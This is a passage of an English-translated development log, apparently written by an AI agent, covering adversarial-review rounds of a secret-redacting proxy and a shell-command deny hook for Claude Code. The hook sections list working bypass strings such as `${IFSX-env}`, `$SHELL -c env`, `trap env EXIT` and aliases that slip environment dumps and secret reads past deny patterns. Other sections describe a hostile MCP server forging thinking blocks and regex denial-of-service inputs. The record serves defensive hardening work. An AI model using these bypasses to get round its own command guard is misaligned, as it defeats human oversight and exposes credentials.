+and it comes down to a single repeated mistake: I modelled every bash
+mechanism as a single-value approximation, where bash produces several values
+or chooses between two branches.
 
-- **Expansion d'accolades** : je gardais l'alternative la plus longue. Bash en
-  produit PLUSIEURS mots, préfixe et suffixe recollés — `{curl,autrechose} URL`
-  lance bel et bien `curl`. Le mot entier est désormais expansé.
-- **Repli d'expansion** : `${x:-env}` vaut le REPLI quand `x` est vide, et bash
-  l'EXÉCUTE ; je ne rendais que `$x`. Les deux branches sont maintenant émises,
-  séparées par `;` — sans ce séparateur, `$x` occupait la position de programme
-  et masquait le repli. Cela referme aussi `${x:-$(env)}`, dont la substitution
-  était jetée avec le repli.
-- **`env -S`** : sa valeur est une COMMANDE entière, pas un token. Le déclarer
-  « option à valeur » faisait sauter le programme.
-- **`X= env`** : mon saut de token après une affectation confondait le préfixe
-  d'affectation VIDE avec le marqueur d'une substitution. On ne saute plus que
-  le marqueur.
-- **Heredoc au pipe collé** (`<<'FIN' |bash`) : le découpage sur les espaces
-  donnait le token `|bash`, absent des interpréteurs.
+- **Brace expansion**: I kept the longest alternative. Bash produces SEVERAL
+  words, with prefix and suffix reattached — `{curl,autrechose} URL` does
+  launch `curl`. The whole word is now expanded.
+- **Expansion fallback**: `${x:-env}` evaluates to the FALLBACK when `x` is
+  empty, and bash EXECUTES it; I only emitted `$x`. Both branches are now
+  emitted, separated by `;` — without that separator, `$x` occupied the
+  program position and hid the fallback. That also re-closes `${x:-$(env)}`,
+  whose substitution was thrown away with the fallback.
+- **`env -S`**: its value is a full COMMAND, not a token. Declaring it a
+  "valued option" made the program get skipped.
+- **`X= env`**: my token skip after an assignment confused the EMPTY
+  assignment prefix with the marker of a substitution. Only the marker is
+  skipped now.
+- **Heredoc glued to a pipe** (`<<'FIN' |bash`): whitespace splitting yielded
+  the token `|bash`, absent from the interpreter list.
 
-**Faux positif réintroduit puis re-corrigé** : `_APPEL_EXEC_RE` balayait la
-commande ENTIÈRE, si bien que
-`git commit -m 'fix subprocess.run for curl backend'` était refusé — exactement
-le défaut que le round 5 venait d'éliminer. La règle est de nouveau réservée au
-code donné EN LIGNE ; les formes parenthésées restent couvertes partout par
+**False positive reintroduced then re-fixed**: `_APPEL_EXEC_RE` swept the
+WHOLE command, so
+`git commit -m 'fix subprocess.run for curl backend'` was refused — exactly
+the defect round 5 had just eliminated. The rule is again restricted to code
+given IN LINE; the parenthesised forms remain covered everywhere by
 `_NESTED_RE`.
 
-**Attente de test corrigée** : `{env,foolong}` donne `env foolong`, qui EXÉCUTE
-`foolong` au lieu de déverser l'environnement — j'attendais un refus à tort.
+**Test expectation corrected**: `{env,foolong}` yields `env foolong`, which
+EXECUTES `foolong` instead of dumping the environment — I was wrongly
+expecting a refusal.
 
 ### Walker — round 7
-- **Le drapeau `protocole` se propageait dans le SCHÉMA.** Posé par `tools`, il
-  descendait jusqu'aux clés d'un `input_schema` autres que `properties` :
-  `default`, `example`, `const` portent des valeurs d'exemple, où `name` et
-  `id` sont des DONNÉES. Un schéma est structurel — aucun nom n'y est une clé
-  de routage. Encore une conséquence de mon correctif du round 6.
-- **`close()` émettait APRÈS `message_stop`** : ces deltas sont hors protocole,
-  donc ignorés en silence par le client ou fatals selon son parseur. Les
-  accumulateurs sont désormais vidés à l'arrivée de `message_delta`.
-- `walk_request` sur un corps non-objet levait `AttributeError`/`TypeError`,
-  que le proxy ne rattrape pas → `ValueError`.
+- **The `protocole` flag propagated into the SCHEMA.** Set by `tools`, it
+  descended to the keys of an `input_schema` other than `properties`:
+  `default`, `example`, `const` carry example values, where `name` and `id`
+  are DATA. A schema is structural — no name in it is a routing key. Another
+  consequence of my round-6 fix.
+- **`close()` emitted AFTER `message_stop`**: these deltas are out of
+  protocol, hence silently ignored by the client or fatal depending on its
+  parser. The accumulators are now flushed on the arrival of `message_delta`.
+- `walk_request` on a non-object body raised `AttributeError`/`TypeError`,
+  which the proxy does not catch → `ValueError`.
 
-### Faux positif du DÉTECTEUR trouvé par l'E2E — déviation à valider par jo
-`tests/phase3_e2e.sh` a commencé à échouer par « limite de tours atteinte ».
-Cause : le détecteur classe `infra.md` en URL — `.md` est le TLD de la
-Moldavie. **Tout fichier Markdown nommé dans un prompt voyait son extension
-muée en faux domaine**, l'agent ne retrouvait plus le fichier désigné et
-brûlait ses tours à le chercher. `README.md`, `CLAUDE.md`, un plan : c'est
-constant dans un contexte d'agent.
+### DETECTOR false positive found by the E2E — deviation for jo to validate
+`tests/phase3_e2e.sh` started failing with "turn limit reached". Cause: the
+detector classes `infra.md` as a URL — `.md` is Moldova's TLD. **Any Markdown
+file named in a prompt had its extension turned into a fake domain**, the
+agent no longer found the file it was told about and burned its turns
+searching for it. `README.md`, `CLAUDE.md`, a plan: this is constant in an
+agent context.
 
-Ajouté à `config/allowlist.txt` : une regex couvrant les extensions dont
-l'usage comme nom d'hôte interne est invraisemblable. `.io`, `.ai`, `.dev`,
-`.app`, `.co` et `.sh` en sont volontairement ABSENTS — ce sont des domaines
-réellement utilisés. **Le détecteur doit être redémarré** après ce changement.
+Added to `config/allowlist.txt`: a regex covering the extensions whose use as
+an internal hostname is implausible. `.io`, `.ai`, `.dev`, `.app`, `.co` and
+`.sh` are deliberately ABSENT — those are actually used as domains. **The
+detector must be restarted** after this change.
 
-## Neuvième revue adversariale (2026-08-04, round 8)
-**La règle d'allowlist que je venais d'ajouter était une fuite.** Son radical
-`[\w.-]+` admettait les POINTS : elle rendait donc public tout ce qui se
-termine par une de ces extensions, pas seulement un nom de fichier.
-`srv-billing-prod.acme.internal.conf`, `com.acme.billing.SecretClient.kt`,
-`api.acme.corp.json`, `10.0.0.5.log` sortaient EN CLAIR — et sans la moindre
-trace : pas d'entrée de coffre, pas de substitut non résolu, rien que le
-harnais d'egress ou le corpus puisse compter. Neuf cas sur neuf.
+## Round 8 (2026-08-04)
+**The allowlist rule I had just added was a leak.** Its stem `[\w.-]+`
+allowed DOTS: it therefore made public anything ending in one of these
+extensions, not just a file name. `srv-billing-prod.acme.internal.conf`,
+`com.acme.billing.SecretClient.kt`, `api.acme.corp.json`, `10.0.0.5.log` came
+out IN THE CLEAR — with no trace at all: no vault entry, no unresolved
+surrogate, nothing the egress harness or the corpus could count. Nine cases
+out of nine.
 
-Corrigé en interdisant le point dans le radical : un nom de fichier n'a qu'un
-seul label. Beaucoup de ces extensions SONT des TLD (`.py` Paraguay, `.rs`
-Serbie, `.ml` Mali, `.tf`, `.pl`) — c'est cette restriction, et elle seule, qui
-les rend sûres ici. Verrouillé par `test_un_identifiant_a_plusieurs_labels_
-n_est_pas_public`.
+Fixed by forbidding the dot in the stem: a file name has only one label. Many
+of these extensions ARE TLDs (`.py` Paraguay, `.rs` Serbia, `.ml` Mali, `.tf`,
+`.pl`) — that restriction, and only that, is what makes them safe here.
+Locked by `test_un_identifiant_a_plusieurs_labels_n_est_pas_public`.
 
-**Leçon** : c'est la seule règle de toute la boucle qui rende des valeurs
-PUBLIQUES, donc la seule dont le mode d'échec soit une fuite SILENCIEUSE. Tout
-le reste échoue bruyamment (400, 500, 503, commande refusée). Une règle qui
-élargit le public mérite un test dédié avant d'être écrite.
+**Lesson**: it is the only rule in the whole loop that makes values PUBLIC,
+therefore the only one whose failure mode is a SILENT leak. Everything else
+fails loudly (400, 500, 503, refused command). A rule that widens the public
+set deserves a dedicated test before it is written.
 
 ### Hook — round 8
-Deux contournements, encore issus des correctifs du round 7 :
-- **`${IFS…}` n'était pas ancré sur le MOT** : `${IFSX-env}` passait pour une
-  variante d'IFS, était remplacé par une espace, et son repli disparaissait
-  avec lui. Un préfixe de quatre lettres suffisait à exécuter n'importe quelle
-  commande refusée.
-- **Le `;` que j'injectais pour séparer les branches d'un repli coupait la
-  classe `[^|;&]*` de TOUS les motifs de `DENY_COMMAND_PATTERNS`** — dix-huit
-  motifs désarmés d'un coup : `kubectl ${UNDEF-get} secret x`,
+Two bypasses, again from the round-7 fixes:
+- **`${IFS…}` was not anchored on the WORD**: `${IFSX-env}` passed for an IFS
+  variant, was replaced by a space, and its fallback disappeared with it. A
+  four-letter prefix was enough to execute any refused command.
+- **The `;` I injected to separate the branches of a fallback cut the
+  `[^|;&]*` class of ALL patterns in `DENY_COMMAND_PATTERNS`** — eighteen
+  patterns disarmed in one go: `kubectl ${UNDEF-get} secret x`,
   `terraform ${UNDEF-state} list`, `gh ${UNDEF-api} …`, `ps ${UNDEF-auxe}`…
-  La branche « variable vide » est désormais analysée comme une COMMANDE
-  entière (`_variante_repli`), et le texte normalisé ne porte plus que la
-  référence.
+  The "empty variable" branch is now analysed as a full COMMAND
+  (`_variante_repli`), and the normalised text carries only the reference.
 
-**Faux positifs corrigés** : une substitution CONCATÉNÉE à un préfixe
-(`SUFFIX=v$(git describe)-final`) restait une valeur d'affectation ; un message
-de commit qui CITE un one-liner (`git commit -m 'fix perl -e system(env)'`)
-n'en exécute aucun — la porte porte maintenant sur la POSITION DE PROGRAMME,
-pas sur la présence du mot dans le texte.
+**False positives fixed**: a substitution CONCATENATED to a prefix
+(`SUFFIX=v$(git describe)-final`) remained an assignment value; a commit
+message that QUOTES a one-liner (`git commit -m 'fix perl -e system(env)'`)
+executes nothing — the gate now hinges on the PROGRAM POSITION, not on the
+mere presence of the word in the text.
 
-**Disponibilité** : borner la seule profondeur de l'expansion d'accolades
-laissait le PRODUIT des alternatives exploser — vingt alternatives sur cinq
-groupes faisaient pendre le hook plus de huit secondes, de quoi noyer un agent
-sans écrire une seule commande interdite. Budget total désormais borné : 0,15 s
-sur le même cas.
+**Availability**: bounding only the depth of brace expansion let the PRODUCT
+of the alternatives explode — twenty alternatives across five groups hung the
+hook for more than eight seconds, enough to drown an agent without writing a
+single forbidden command. Total budget now bounded: 0.15 s on the same case.
 
-## Dixième revue adversariale (2026-08-04, round 9)
+## Round 9 (2026-08-04)
 
-**Moteur — la règle d'extensions fuyait encore, par un autre chemin.** Elle
-n'était plus trop large en elle-même, mais l'allowlist est PARTAGÉE avec les
-sous-parties d'une valeur composite (tag d'image, segment d'URL) — c'est son
-intention documentée. Or une règle de FORME suppose un contexte que la
-sous-partie n'a pas : `https://interne/tenant-acme-nda.md` sortait avec son
-segment intact, `registry/app:client-report-2025.md` avec son tag.
+**Engine — the extensions rule was still leaking, by another path.** It was
+no longer too broad on its own, but the allowlist is SHARED with the
+sub-parts of a composite value (image tag, URL segment) — that is its
+documented intent. But a FORM rule assumes a context the sub-part does not
+have: `https://interne/tenant-acme-nda.md` came out with its segment intact,
+`registry/app:client-report-2025.md` with its tag.
 
-Distinction introduite : une entrée EXACTE est une décision prise token par
-token (« `python3.12-slim` est public »), elle vaut partout ; une règle `re:`
-ne vaut que là où le contexte la justifie. Les sous-parties consultent
-désormais `Allowlist.is_exact`, le détecteur garde le prédicat complet.
+Distinction introduced: an EXACT entry is a decision taken token by token
+(`python3.12-slim` is public), it holds everywhere; a `re:` rule only holds
+where the context justifies it. The sub-parts now consult
+`Allowlist.is_exact`, the detector keeps the full predicate.
 
-**Hook — trois contournements** : le programme désigné par une VARIABLE
-(`$SHELL -c env`) — la tokenisation retirait le sigil et laissait un mot que
-rien ne reconnaît ; `${IFS:+texte}` rend le TEXTE et non un séparateur, alors
-que je remplaçais toute forme `${IFS…}` par une espace ; le nom d'une expansion
-peut être POSITIONNEL ou spécial (`${1:-env}`, `${@:-env}`).
-Plus : un repli imbriqué demande autant de réductions qu'il a de niveaux ;
-`\bexec\b` ratait `execvp` ; `fish`, `csh`, `tcsh` manquaient.
+**Hook — three bypasses**: the program named by a VARIABLE (`$SHELL -c env`)
+— tokenisation removed the sigil and left a word nothing recognises;
+`${IFS:+texte}` yields the TEXT and not a separator, while I was replacing
+every `${IFS…}` form with a space; the name of an expansion can be
+POSITIONAL or special (`${1:-env}`, `${@:-env}`). Plus: a nested fallback
+requires as many reductions as it has levels; `\bexec\b` missed `execvp`;
+`fish`, `csh`, `tcsh` were missing.
 
-**Faux positifs** : `git commit -m '…system(env)…' && python3 --version` était
-refusé — la porte s'ouvrait sur la commande ENTIÈRE dès qu'un interpréteur
-figurait quelque part. Elle porte maintenant sur la commande SIMPLE et exige le
-drapeau de programme en ligne. Le découpage ignore le `;`, qui sépare des
-INSTRUCTIONS dans un programme en ligne, pas des commandes. Et `-c`
-n'introduit une commande que pour un SHELL : pour `git` ou `xargs` il veut dire
-autre chose.
+**False positives**: `git commit -m '…system(env)…' && python3 --version` was
+refused — the gate opened on the WHOLE command as soon as an interpreter
+appeared anywhere. It now hinges on the SIMPLE command and requires the
+inline-program flag. The splitting ignores `;`, which separates STATEMENTS in
+an inline program, not commands. And `-c` only introduces a command for a
+SHELL: for `git` or `xargs` it means something else.
 
-**Disponibilité** : le budget d'expansion d'accolades était PAR MOT ; le volume
-total explosait quand même, et c'est la TAILLE du texte produit qui coûte
-ensuite — quinze secondes d'analyse. Budget partagé sur toute la commande.
+**Availability**: the brace-expansion budget was PER WORD; the total volume
+exploded anyway, and it is the SIZE of the produced text that costs after —
+fifteen seconds of analysis. Budget shared across the whole command.
 
-**Cas de test du rapport écarté** : `cu${IFS:+r}rl` donne `currl`, pas `curl` —
-en bash non plus. J'ai corrigé l'attente plutôt que le code.
+**Test case from the report discarded**: `cu${IFS:+r}rl` yields `currl`, not
+`curl` — nor in bash. I corrected the expectation rather than the code.
 
-## Onzième revue adversariale (2026-08-04, round 10)
+## Round 10 (2026-08-04)
 
-**Walker, CRITIQUE — l'opacité était forgeable partout SAUF dans les données
-utilisateur.** Le correctif `USER_DATA_KEYS` du round 4 fermait `input` et
-`metadata` ; or un bloc signé n'est produit que par l'API et ne revient que
-dans le `content` d'un message ASSISTANT. Partout ailleurs, `type` est une
-valeur qu'un tiers ÉCRIT. Cinq surfaces sortaient verbatim, dont la pire : un
-serveur MCP hostile renvoie `{"type":"thinking", …}`, Claude Code le réémet
-dans un `tool_result`, la valeur part en clair. Mode d'échec SILENCIEUX — pas
-d'entrée de coffre, pas de substitut non résolu, rien à compter.
-Au RETOUR, l'opacité reste permissive : le corps vient d'Anthropic, la
-restauration ne fait rien SORTIR, et traverser un bloc signé invaliderait sa
-signature (D3) — le risque s'inverse, donc la règle aussi.
+**Walker, CRITICAL — opacity was forgeable everywhere EXCEPT in user data.**
+The round-4 `USER_DATA_KEYS` fix closed `input` and `metadata`; but a signed
+block is only produced by the API and only comes back inside the `content` of
+an ASSISTANT message. Everywhere else, `type` is a value written by a third
+party. Five surfaces were coming out verbatim, the worst being: a hostile MCP
+server returns `{"type":"thinking", …}`, Claude Code re-emits it inside a
+`tool_result`, the value leaves in the clear. SILENT failure mode — no vault
+entry, no unresolved surrogate, nothing to count.
+On the RETURN path, opacity stays permissive: the body comes from Anthropic,
+restoration puts nothing OUT, and traversing a signed block would invalidate
+its signature (D3) — the risk is inverted, so is the rule.
 
-### Hook — round 10 : dix contournements, tous des mécanismes de bash non modélisés
-Cette fois ce ne sont PAS des régressions du round 9 (les correctifs d'IFS,
-d'expansion, de repli et de position de programme ont tous tenu), mais des
-mécanismes que je n'avais jamais modélisés :
-- **Un interpréteur reçoit son programme autrement qu'en ligne.** Tout le
-  contrôle du code était adossé à `-c`/`-e` ; par here-string (`<<<`), par
-  heredoc, par tiret nu (`python3 -`) ou par substitution de processus, le même
-  code n'était analysé que comme du shell, où `os.system("env")` est un mot
-  parmi d'autres. Les formes livrées sont désormais RAMENÉES à la forme en
-  ligne — un seul chemin d'analyse, pas une liste de cas. Un heredoc consommé
-  par un PIPE (`cat <<EOF | python3`) relève, lui, du montage non analysable.
-- **`{` et `}` n'étaient pas des séparateurs** : `fn() { env; }; fn` et
-  `{ env; }` s'arrêtaient sur `fn` ou sur l'accolade. Retirées seulement là où
-  bash y voit le mot réservé — les retirer partout emportait le remplaçant de
-  `xargs -I{}`, dont l'option avalait alors le programme suivant.
-- **`declare -n r=CIBLE` est un ALIAS** : `echo $r` lit la variable cible, et
-  `$r` ne porte aucun nom sensible. Même mécanisme que `${!x}`, autre syntaxe.
-- **Une affectation qui exécute** : bash source `BASH_ENV` avant tout `-c`,
-  l'éditeur de liens charge `LD_PRELOAD`. `ENV=` n'est refusé que si sa valeur
-  est un CHEMIN (`ENV=production` est un idiome courant), `NODE_OPTIONS` que
-  s'il porte `--require`.
-- **`bash -c env _`** : la valeur de `-c` est le SCRIPT ENTIER, `_` occupe
-  `$0`. Le quoting étant déjà retiré, les deux lectures sont indiscernables :
-  on émet les DEUX, comme pour une branche d'expansion.
-- **`env --split-string=CMD`** : la forme longue COLLÉE commence par `-`, elle
-  passait pour une option ordinaire ; `-S` séparé était déjà couvert.
+### Hook — round 10: ten bypasses, all unmodelled bash mechanisms
+This time they are NOT regressions of round 9 (the IFS, expansion, fallback
+and program-position fixes all held), but mechanisms I had never modelled:
+- **An interpreter receives its program otherwise than in line.** All the code
+  control was tied to `-c`/`-e`; via here-string (`<<<`), via heredoc, via
+  bare dash (`python3 -`) or via process substitution, the same code was only
+  analysed as shell, where `os.system("env")` is one word among many. The
+  delivered forms are now REDUCED to the inline form — a single analysis
+  path, not a list of cases. A heredoc consumed by a PIPE
+  (`cat <<EOF | python3`) belongs, itself, to the non-analysable
+  arrangements.
+- **`{` and `}` were not separators**: `fn() { env; }; fn` and `{ env; }`
+  stopped on `fn` or on the brace. Removed only where bash sees the reserved
+  word — removing them everywhere carried off the placeholder for
+  `xargs -I{}`, whose option then swallowed the following program.
+- **`declare -n r=CIBLE` is an ALIAS**: `echo $r` reads the target variable,
+  and `$r` carries no sensitive name. Same mechanism as `${!x}`, other
+  syntax.
+- **An assignment that executes**: bash sources `BASH_ENV` before any `-c`,
+  the linker loads `LD_PRELOAD`. `ENV=` is only refused when its value is a
+  PATH (`ENV=production` is a common idiom), `NODE_OPTIONS` only when it
+  carries `--require`.
+- **`bash -c env _`**: the value of `-c` is the WHOLE SCRIPT, `_` occupies
+  `$0`. Quoting having already been removed, both readings are
+  indistinguishable: we emit BOTH, as for an expansion branch.
+- **`env --split-string=CMD`**: the ATTACHED long form starts with `-`, it
+  passed for an ordinary option; separated `-S` was already covered.
 
-**Disponibilité — le DoS ne venait pas d'où je le croyais.** Un mot de vingt
-mille caractères coûtait sept secondes. Le budget d'accolades des rounds 8-9
-n'y pouvait rien : c'est `re.search` qui explose AVANT, sur des motifs dont la
-tête est une CLASSE LIBRE (`\S*\{…`, `[\w-]*\.env`, `[\w./-]*secrets?`) — elles
-rétro-traquent à chaque position. Tous ancrés sur leur littéral, l'expansion
-d'accolades se fait mot à mot après découpage sur les espaces : **0,04 s**.
-Deux des trois motifs étaient là depuis le début, jamais mesurés.
+**Availability — the DoS did not come from where I thought.** A twenty
+thousand character word cost seven seconds. The braces budget from rounds 8-9
+could do nothing about it: it is `re.search` that explodes BEFORE, on
+patterns whose head is a FREE CLASS (`\S*\{…`, `[\w-]*\.env`,
+`[\w./-]*secrets?`) — they backtrack at every position. All anchored on
+their literal, brace expansion happens word by word after whitespace
+splitting: **0.04 s**. Two of the three patterns had been there from the
+start, never measured.
 
-**Faux positif introduit puis corrigé** : retirer `{}` partout cassait
-`xargs -I{}`, attrapé par les tests unitaires du round 8.
+**False positive introduced then fixed**: removing `{}` everywhere broke
+`xargs -I{}`, caught by the round-8 unit tests.
 
-**Attente de test corrigée** : le rapport donnait
-`env --split-string='printenv HOME'` comme contournement — `printenv HOME`
-n'expose rien, l'autoriser est le bon comportement. Vérifié sur les charges
-NOCIVES (`printenv AWS_…`, `curl`, `env`), toutes refusées.
+**Test expectation corrected**: the report gave
+`env --split-string='printenv HOME'` as a bypass — `printenv HOME` exposes
+nothing, allowing it is the right behaviour. Checked on the HARMFUL payloads
+(`printenv AWS_…`, `curl`, `env`), all refused.
 
-**Résidu de la règle d'extensions, ÉNONCÉ au lieu d'être supposé.** Mon
-commentaire du round 8 affirmait que la restriction à un seul label « les rend
-sûres » : c'est FAUX. Elle BORNE la fuite. `.md`, `.pl`, `.py`, `.rs`, `.ml`,
-`.tf` sont des ccTLD, donc un domaine externe d'un seul label (`acme.pl`) sort
-en clair. Le type du span ne permet pas de trancher — mesuré : `acme.fr` dans
-« le serveur acme.fr » et `infra.fr` dans « le fichier infra.fr » donnent les
-MÊMES types (HOSTNAME + URL). Retirer ces extensions ferait muer `main.py`,
-`lib.rs` et `main.tf` en faux domaines, ce qui a déjà interrompu une session
-réelle.
+**Residual of the extensions rule, STATED instead of assumed.** My round-8
+comment claimed the single-label restriction "makes them safe": that is
+FALSE. It BOUNDS the leak. `.md`, `.pl`, `.py`, `.rs`, `.ml`, `.tf` are
+ccTLDs, so an external single-label domain (`acme.pl`) leaves in the clear.
+The span type does not let us decide — measured: `acme.fr` in "the server
+acme.fr" and `infra.fr` in "the file infra.fr" give the SAME types
+(HOSTNAME + URL). Removing these extensions would turn `main.py`, `lib.rs`
+and `main.tf` into fake domains, which has already broken a real session.
 
-**Arbitrage de jo (2026-08-04)** : la liste se rejuge extension par extension,
-pas en bloc. `.pl` (Pologne) et `.ml` (Mali) SORTENT — ce sont les deux ccTLD
-de la liste à porter un vrai volume de domaines, et leur valeur d'extension est
-faible ici (zéro fichier Perl ou OCaml dans le dépôt). `.md`, `.py`, `.rs`,
-`.tf` restent : ce sont 54 fichiers du dépôt, cités à chaque tour.
-Et le résidu cesse d'être SILENCIEUX : `/detect` renvoie `public_by_shape`,
-la liste dédoublonnée des tokens rendus publics par une règle de FORME, avec
-leurs types de span et la règle en cause. Une entrée EXACTE n'y figure pas —
-c'est une décision prise token par token, pas une heuristique.
+**Jo's arbitration (2026-08-04)**: the list is rejudged extension by
+extension, not as a whole. `.pl` (Poland) and `.ml` (Mali) LEAVE — they are
+the two list ccTLDs that carry a real volume of domains, and their value as
+an extension is low here (zero Perl or OCaml file in the repo). `.md`,
+`.py`, `.rs`, `.tf` stay: those are 54 files in the repo, quoted every turn.
+And the residual stops being SILENT: `/detect` returns `public_by_shape`,
+the deduplicated list of tokens made public by a FORM rule, with their span
+types and the rule at fault. An EXACT entry does not appear there — it is a
+decision taken token by token, not a heuristic.
 
-## Douzième revue adversariale (2026-08-04, round 11 — walker et moteur)
+## Round 11 (2026-08-04) — walker and engine
 
-**CRITIQUE — mon correctif du round 10 était encore forgeable.** J'avais
-restreint l'opacité au `content` d'un message ASSISTANT, en testant
-`node.get("role")` sur le dict COURANT. N'importe quel dict imbriqué portant ce
-rôle l'obtenait donc — y compris dans un `tool_result`, dont le contenu vient
-d'un serveur MCP. La propriété avait été RÉTRÉCIE, pas supprimée : de « tout
-dict de type thinking » à « tout dict de rôle assistant ». Cinq surfaces,
-vérifiées.
-La légitimité est une propriété de POSITION : elle descend depuis la racine
-`messages` (`dans_messages`), elle ne se déduit pas d'un nœud isolé. C'est la
-troisième fois que ce piège se referme sur moi — `SKIP_KEYS` au round 5,
-l'heuristique de protocole au round 6, celui-ci.
+**CRITICAL — my round-10 fix was still forgeable.** I had restricted opacity
+to the `content` of an ASSISTANT message, by testing `node.get("role")` on
+the CURRENT dict. Any nested dict bearing that role got the protection —
+including inside a `tool_result`, whose content comes from an MCP server.
+The property had been NARROWED, not removed: from "any dict of type
+thinking" to "any dict of role assistant". Five surfaces, checked.
+Legitimacy is a property of POSITION: it descends from the root `messages`
+(`dans_messages`), it is not inferred from an isolated node. This is the
+third time this trap closes on me — `SKIP_KEYS` at round 5, the protocol
+heuristic at round 6, this one.
 
-**La queue LIBRE des règles de forme, partout ailleurs.** Le round 8 avait
-fermé cette classe pour la règle d'extensions. La même queue subsistait dans
-les chemins d'URL (`(/[\w./-]*)?`), les chemins d'import Go et les chemins
-d'image — et ces deux dernières acceptent le TIRET, donc un vrai nom d'hôte y
-entre : `k8s.io/db-01.acme.internal`, `registry.k8s.io/db-01.acme.internal/app`,
-`https://json-schema.org/db-01.acme.internal/schema` sortaient en clair.
-Chaque segment est désormais borné à un mot ou à un nom de fichier (UN point) ;
-pour une image, à un mot sans point — dans une référence d'image, le point
-désigne un hôte de registre, déjà épinglé par le préfixe.
-**L'agent n'avait testé que les URL et les paquets Java : les six fuites des
-chemins Go et image viennent de ma propre extension du périmètre.**
+**The FREE tail of the form rules, everywhere else.** Round 8 had closed
+this class for the extensions rule. The same tail remained in URL paths
+(`(/[\w./-]*)?`), Go import paths and image paths — and the last two accept
+the DASH, so a real hostname fits in there: `k8s.io/db-01.acme.internal`,
+`registry.k8s.io/db-01.acme.internal/app`,
+`https://json-schema.org/db-01.acme.internal/schema` came out in the clear.
+Each segment is now bounded to a word or a file name (ONE dot); for an
+image, to a word without dot — in an image reference, the dot marks a
+registry host, already pinned by the prefix.
+**The agent had only tested URLs and Java packages: the six Go and image
+path leaks come from my own extension of the perimeter.**
 
-**Deux défauts mineurs, tous deux des pannes futures** : une sous-clé
-inattendue dans `cache_control` faisait substituer `type` — qui n'accepte que
-`ephemeral` — donc 400 sur la requête ENTIÈRE dès qu'Anthropic ajoute un champ ;
-et un type d'événement SSE inconnu était rendu verbatim, ses substituts non
-restaurés (l'opérateur voit le nom fictif, un outil s'y exécuterait).
+**Two minor defects, both future breakages**: an unexpected sub-key in
+`cache_control` caused `type` to be substituted — which only accepts
+`ephemeral` — hence 400 on the WHOLE request as soon as Anthropic adds a
+field; and an unknown SSE event type was rendered verbatim, its surrogates
+not restored (the operator sees the fictional name, a tool would execute on
+it).
 
-**Résidu assumé, compté** : un segment d'UN SEUL label sous un préfixe public
-(`sigs.k8s.io/tenant-acme-nda`, `org.apache.kafka.…acme.PaymentsClient`) reste
-public — indiscernable d'un vrai module ou d'un vrai paquet. Les paquets Java
-n'acceptent pas le tiret, ce qui exclut la plupart des noms d'hôtes internes.
+**Accepted residual, counted**: a SINGLE-label segment under a public prefix
+(`sigs.k8s.io/tenant-acme-nda`, `org.apache.kafka.…acme.PaymentsClient`)
+stays public — indistinguishable from a real module or a real package. Java
+packages do not accept the dash, which excludes most internal hostnames.
 
-### Hook — round 11 : quatre mécanismes de bash jamais modélisés
-La consigne que je m'étais donnée au round 10 — « chercher ce qui n'a JAMAIS
-été modélisé, pas seulement les régressions » — a payé : quatre familles
-n'étaient couvertes par AUCUNE règle.
-- **`trap CMD SIGNAL`** exécute CMD au signal (`EXIT`, `ERR`, `DEBUG`,
-  `RETURN`, numérique). Le nom du signal SUIT la commande, si bien que
-  `trap env EXIT` se lisait « env exécute EXIT », donc un préfixe légitime.
-  La commande est isolée — même remède que `bash -c env _` au round 10.
-- **`case MOTIF) CMD;;`** : la commande suit la parenthèse fermante, et
-  l'analyse s'arrêtait sur `case`. Reconnu SEULEMENT en position de commande,
-  sinon un message de commit contenant « case … in … » verrait ses parenthèses
-  coupées et la prose redeviendrait du code.
-- **`coproc [NOM] cmd`** : le nom étant facultatif, la commande occupe tantôt
-  la première position, tantôt la seconde — les deux lectures sont émises.
-- **`mapfile -C RAPPEL -c N`** exécute RAPPEL toutes les N lignes lues.
-- **Alias développé sur une ligne SUIVANTE** : `alias e=env` puis `e`. Le
-  round précédent avait conclu à tort que les alias ne s'exécutent pas — c'est
-  vrai dans la ligne qui les DÉFINIT, faux dans les suivantes.
+### Hook — round 11: four bash mechanisms never modelled
+The instruction I had given myself at round 10 — "look for what has NEVER
+been modelled, not only the regressions" — paid off: four families were
+covered by NO rule.
+- **`trap CMD SIGNAL`** executes CMD on the signal (`EXIT`, `ERR`, `DEBUG`,
+  `RETURN`, numeric). The signal name FOLLOWS the command, so
+  `trap env EXIT` read as "env executes EXIT", therefore a legitimate
+  prefix. The command is isolated — same remedy as `bash -c env _` at
+  round 10.
+- **`case MOTIF) CMD;;`**: the command follows the closing parenthesis, and
+  the analysis stopped on `case`. Recognised ONLY in command position,
+  otherwise a commit message containing "case … in …" would see its
+  parentheses cut and the prose would become code again.
+- **`coproc [NOM] cmd`**: the name being optional, the command occupies
+  either the first position or the second — both readings are emitted.
+- **`mapfile -C RAPPEL -c N`** executes RAPPEL every N lines read.
+- **Alias expanded on a FOLLOWING line**: `alias e=env` then `e`. The
+  previous round had wrongly concluded aliases do not execute — that is
+  true on the line that DEFINES them, false on the following ones.
 
-**Trois régressions de mes correctifs du round 10** :
-- **Déni de service dans le contrôle des variables** : je cherchais CHAQUE
-  cible dans toute la commande, soit O(cibles × longueur). Cinq mille
-  `declare -n` — que des primitives bash — faisaient pendre le hook 3,25 s,
-  vingt mille une minute, avant CHAQUE appel d'outil. Index construit en une
-  passe : **0,21 s**.
-- **Noms de fonction** : je ne remontais que sur des caractères de mot, alors
-  que bash accepte `my.fn`, `a+b`, `a@b`, `a/b`, `1fn`.
-- **Grammaire d'options des interpréteurs** : une option à VALEUR
-  (`python3 -X faulthandler <<< …`) coupait la chaîne, et l'interpréteur
-  n'était plus vu comme recevant un programme.
+**Three regressions of my round-10 fixes**:
+- **Denial of service in the variable check**: I was searching EACH target
+  in the whole command, so O(targets × length). Five thousand `declare -n`
+  — all bash primitives — hung the hook for 3.25 s, twenty thousand for a
+  minute, before EACH tool call. Index built in one pass: **0.21 s**.
+- **Function names**: I only walked back over word characters, while bash
+  accepts `my.fn`, `a+b`, `a@b`, `a/b`, `1fn`.
+- **Interpreter option grammar**: a VALUED option
+  (`python3 -X faulthandler <<< …`) cut the chain, and the interpreter was
+  no longer seen as receiving a program.
 
-**Liste morte supprimée** : `_INTERPRETE_EN_LIGNE` dupliquait `_INTERPRETES`
-sans être lue nulle part. Seize interpréteurs ajoutés (`python2`, `pypy`,
-`ipython`, `groovy`, `elixir`, `racket`…) — un `groovy -e` lisant la table
-d'environnement (System.getenv()) passait sur une machine où il est installé.
+**Dead list removed**: `_INTERPRETE_EN_LIGNE` duplicated `_INTERPRETES`
+without being read anywhere. Sixteen interpreters added (`python2`, `pypy`,
+`ipython`, `groovy`, `elixir`, `racket`…) — a `groovy -e` reading the
